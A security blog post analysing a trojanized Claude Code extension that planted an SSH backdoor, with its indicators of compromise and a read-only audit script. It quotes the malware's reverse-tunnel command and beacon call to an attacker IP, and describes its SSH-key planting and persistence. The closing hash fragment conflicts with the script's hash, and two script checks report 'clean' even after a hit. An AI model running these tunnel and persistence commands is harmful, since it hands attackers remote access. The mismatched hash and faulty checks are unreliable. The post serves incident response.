---
titre: "A trojanized Claude Code extension plants an SSH backdoor: the 7-point audit for your machine"
date: 2026-10-30
themes: securite, agents
resume: "anthropic.claude-code@2.1.313 on Open-VSX carried a 66-line loader that SSH-backdoored your machine the moment VS Code loaded it. The mechanism, every IOC, and a read-only audit script I ran on my own machine: 7 checks, 0 indicators, exit 0."
source: https://dev.to/slabb/a-trojanized-claude-code-extension-plants-an-ssh-backdoor-the-7-point-audit-for-your-machine-23cj
image: https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fc9yskyveqblvop4rm3bb.png
image_alt: "A trojanized Claude Code extension plants an SSH backdoor: the 7-point audit for your machine"
---

> This morning's supply-chain drop, two hours old as I write: the VS Code extension **`anthropic.claude-code@2.1.313` was trojanized on Open-VSX**, published from the account of an Anthropic employee, and the malicious version carried a **66-line loader** inserted ahead of the legitimate code. You did not have to chat with Claude, click anything, or approve anything: **loading the extension at VS Code startup executed the payload.** It inventoried your machine, appended an SSH key named `svc-telemetry` to your `authorized_keys`, turned on remote login, opened a reverse tunnel to an attacker server, and persisted as a LaunchAgent disguised as `com.apple.sysmond`. The [full analysis](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor) is out; this post is the mechanism in plain steps, every IOC, and a read-only audit script I already ran on my own machine. Every Claude Code, Cursor, Windsurf or VS Code user should run it tonight.

This is the fourth agent-supply-chain story this blog has covered this month, and the most intimate one: LiteLLM stole the credentials your code runs with, Gheist harvested the secrets your CI holds, and now the tool your agent lives inside is the dropper. The perimeter keeps moving inward.

## What the loader does, step by step

The trojanized build differed from the legitimate one in a single file, `extension.js`, where an IIFE (importing `process`, `fs`, `os`, `http`, `crypto`) was prepended to the real code. No npm lifecycle scripts, no exotic packing. Then, at extension load:

1. **Recon**: `hostname`, `username`, OS and architecture, home directory, **git email**, and the **names of up to 40 environment variables** matching `KEY`, `TOKEN`, `SECRET`, `PASS`, `AWS`, `GCP`. Names, not values, at this stage: an inventory of what you have.

2. **SSH access**: creates `~/.ssh` (`0700`) and appends an Ed25519 public key with the comment **`svc-telemetry`** to `authorized_keys` (`0600`). Fingerprint: `SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk`.

3. **Remote access enabled**: on macOS it runs `sudo -n systemsetup -setremotelogin on` (works if your user has passwordless sudo, silently fails otherwise); on Linux it enables `sshd`; on Windows it installs the **OpenSSH Server**.

4. **Reverse tunnel**: decodes an embedded private key into `${TMPDIR}/.stk_<id>` and loops `ssh tunnel@134.209.82.225 -N -R '*:0:localhost:22'` with host-key checking disabled, reconnecting every 60 seconds (`autossh` when available). Their server can now reach your SSH, from anywhere, through your own outbound connection.
5. **Persistence**: macOS LaunchAgent **`com.apple.sysmond.plist`** (`RunAtLoad`, `KeepAlive`), a name chosen to smell like a system daemon; Linux `@reboot` crontab; Windows scheduled task **`SysMon`** running as `SYSTEM`.
6. **Beacon**: after 1.5 seconds, fetches your public IP from `ifconfig.me` or `api.ipify.org` and POSTs the recon JSON to `http://134.209.82.225:8099/beacon`. The response is ignored; no second-stage downloader was found in this sample.

Discovery credit goes to Dean Hardcastle, who **watched it happen in real time**. Important caveat from the analysts themselves: the trojanized sample came from Open-VSX; the Microsoft Marketplace copy was pulled "in an abundance of caution", and nothing published so far proves Anthropic's own infrastructure was breached. The publisher account is the open question.

## The audit: 7 checks, read-only, exit code tells you

I wrote the sweep from the published IOCs and ran it on my machine before writing this post. Read-only: it checks, it never modifies.

```sh
#!/bin/sh
# hunt_claude_ext.sh - IOC sweep for trojanized anthropic.claude-code@2.1.313
set -u
FOUND=0
hit()  { FOUND=$((FOUND+1)); echo "[!!] $1"; }
clean(){ echo "[ok] $1"; }

# 1. the SSH backdoor key
grep -q "svc-telemetry" "$HOME/.ssh/authorized_keys" 2>/dev/null \
  && hit "authorized_keys contains the svc-telemetry backdoor key" \
  || clean "authorized_keys has no svc-telemetry key"

# 2. the disguised LaunchAgent
[ -f "$HOME/Library/LaunchAgents/com.apple.sysmond.plist" ] \
  && hit "rogue LaunchAgent com.apple.sysmond.plist present" \
  || clean "no rogue com.apple.sysmond LaunchAgent"

# 3. marker files
for f in "$HOME/.config/.smt" "$HOME/.config/.smtk" "$HOME/.config/smt.cmd"; do
  [ -f "$f" ] && hit "marker file $f present"
done
clean "no .smt/.smtk/smt.cmd markers"

# 4. reverse-tunnel key drops
ls "${TMPDIR:-/tmp}"/.stk_* >/dev/null 2>&1 \
  && hit "tunnel key .stk_* in TMPDIR" || clean "no .stk_* in TMPDIR"

# 5. live tunnel process
pgrep -af ssh 2>/dev/null | grep -Eq "134\.209\.82\.225|-R \*:0:localhost:22" \
  && hit "live ssh process matching the C2 tunnel signature" \
  || clean "no ssh process matching the C2 tunnel"

# 6. the extension itself: hash every installed copy's loader
EXT_HASH="ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15"
for d in "$HOME/.vscode/extensions"/anthropic.claude-code-* \
         "$HOME/.vscode-server/extensions"/anthropic.claude-code-* \
         "$HOME/.cursor/extensions"/anthropic.claude-code-*; do
  [ -f "$d/extension.js" ] || continue
  [ "$(shasum -a 256 "$d/extension.js" | cut -d' ' -f1)" = "$EXT_HASH" ] \
    && hit "$d/extension.js MATCHES the trojan hash"
done
clean "no installed extension.js matching the trojan hash"

# 7. macOS Remote Login unexpectedly on
sudo -n systemsetup -getremotelogin 2>/dev/null | grep -q "On" \
  && echo "[??] Remote Login is ON, verify you enabled it yourself" \
  || clean "Remote Login off"

echo "== $FOUND indicator(s) found =="
[ "$FOUND" -gt 0 ] && exit 1 || exit 0
```

My run, tonight, on the machine I am typing this on:

```text
[ok] authorized_keys has no svc-telemetry key
[ok] no rogue com.apple.sysmond LaunchAgent
[ok] no .smt/.smtk/smt.cmd markers
[ok] no .stk_* in TMPDIR
[ok] no ssh process matching the C2 tunnel
[ok] no installed extension.js matching the trojan hash
[ok] Remote Login off
== 0 indicator(s) found ==   (exit 0)
```

A clean run is not a clean bill of health forever (the sample analyzed is one build; the operators iterate), but it answers tonight's question. If any check hits: disconnect the machine from the network, **rotate credentials from a different, clean system** (they inventoried your env-var names for a reason), preserve the artifacts, and rebuild. Interactive SSH access means whatever you find may understate what happened.

## The lesson, again: pin what you run

Three structural notes, because the mechanism will repeat:

- **Open-VSX and the Marketplace serve mutable bits.** A publisher account (here: an Anthropic employee's, question mark hanging over how) can replace a trusted extension's code, and every client that auto-updates receives it. The defense that would have caught this in one second is **hash pinning**, and almost nobody does it for extensions. Check 6 in the script is the pattern: `shasum -a 256` on the loader of everything critical you install, recorded when you install it on purpose.
- **"Loading is executing."** The payload ran at extension activation, before any user interaction with the tool. The mental model of "I only use it when I choose to" does not survive contact with how extensions actually load.
- **The name of the persistence is a social-engineering artifact.** `com.apple.sysmond`, `SysMon`, `svc-telemetry`: every IOC in this attack is designed to survive a casual `ls`. That is why the audit checks exact names and exact hashes, not vibes.

The month's ledger so far: two compromised releases of the most popular LLM proxy, 13,500 secret-dumping CI workflows, transcripts of background agents shipped to the model, and now a trojanized agent extension with SSH persistence. The agents are not the vulnerability. The ecosystem assembling around them is.

**TL;DR**: trojanized `anthropic.claude-code@2.1.313` on Open-VSX backdoored machines at extension load: SSH key `svc-telemetry`, remote login on, reverse tunnel to `134.209.82.225`, LaunchAgent disguised as `com.apple.sysmond`. Seven-check read-only audit above, my machine: zero indicators. Run yours, hash what you install, and if a check hits: rotate from a clean machine and rebuild.

Sources: [OpenSourceMalware: Trojanized Claude Code Extension Plants an SSH Backdoor](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor) · IOCs: extension.js SHA-256 `ecb58cb2…c6bf15`, C2 `134.209.82.225` (22, 8099), key fingerprint `SHA256:0Z6R+…htk`